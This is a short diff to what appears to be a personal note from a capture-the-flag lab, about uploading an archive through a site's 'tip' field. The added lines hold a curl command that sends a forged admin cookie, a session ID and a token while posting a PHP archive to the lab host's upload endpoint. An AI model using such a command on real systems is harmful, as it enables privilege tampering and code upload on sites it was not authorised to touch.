@@ -81,3 +81,7 @@ the question is how do we upload a zip file / archive filed ?
 
 With 7zip I can store / archive the file it clear format. by selecting store. 
 agent22 told me to encode it it url and send it to tip. yet this does not work. The program just sees it as normal text. 
+
+curl command to upload file 
+
+curl --cookie "admin=1; PHPSESSID=oj82onalo99pfrtonsaven2jr5" -F "submit=true" -F "token=b8ed78fb5c0b1a51dd48ed4d53ef438dcb6d3ca34f0b54781c137c85bd0834d6" -F "tip=<hello.php.gz" http://10.10.10.80/?op=upload
